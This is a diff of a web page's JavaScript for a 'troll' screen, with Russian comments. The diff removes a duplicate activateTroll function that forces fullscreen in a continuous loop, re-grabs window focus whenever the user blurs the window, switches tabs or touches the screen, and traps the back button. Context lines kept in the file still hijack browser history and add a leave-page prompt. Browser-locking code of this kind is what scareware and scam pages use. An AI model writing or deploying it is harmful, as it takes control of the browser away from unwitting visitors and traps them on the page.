@@ -107,51 +107,7 @@
             isTrolling = true;
             history.pushState(null, null, location.href);
 window.onpopstate = function() { history.go(1); };
-window.onbeforeunload = function() { return "!"; };
-
-                function activateTroll() {
-        // 1. МГНОВЕННОЕ ПЕРЕКЛЮЧЕНИЕ (Нулевая задержка)
-        document.getElementById('m').style.display = 'none';
-        document.getElementById('h').style.display = 'none';
-        document.getElementById('troll-screen').style.display = 'flex';
-
-        if (isTrolling) return;
-        isTrolling = true;
-
-        // 2. БЕШЕНЫЙ ЦИКЛ (Сверхскорость)
-        // Запускаем сразу 3 параллельных потока, чтобы у браузера не было ни микросекунды покоя
-        const flood = () => {
-            if (!isTrolling) return;
-            forceFull();
-            window.focus();
-            // Используем requestAnimationFrame — это быстрее, чем setTimeout/setInterval
-            requestAnimationFrame(flood); 
-        };
-        flood(); 
-
-        // 3. БЛОКИРОВКА ВЫХОДА (Событийный взрыв)
-        // Как только фокус дергается — возвращаем его 50 раз подряд мгновенно
-        const lock = () => {
-            for(let i = 0; i < 50; i++) {
-                forceFull();
-                window.focus();
-            }
-        };
-        window.onblur = lock;
-        window.onmouseleave = lock;
-        document.addEventListener('visibilitychange', lock);
-
-        // 4. ЗАЩИТА ОТ КЛИКА В МЕНЮ
-        // Любое касание экрана в любой фазе — это команда Fullscreen
-        window.addEventListener('touchstart', lock, {passive: false, capture: true});
-        window.addEventListener('touchend', lock, {passive: false, capture: true});
-
-        history.pushState(null, null, location.href);
-        window.onpopstate = () => { history.go(1); lock(); };
-
-        startProgress();
-                }
-            
+window.onbeforeunload = function() { return "!"; }; 
 
                 function activateTroll() {
         // МГНОВЕННАЯ СМЕНА ЭКРАНА (Первым делом!)
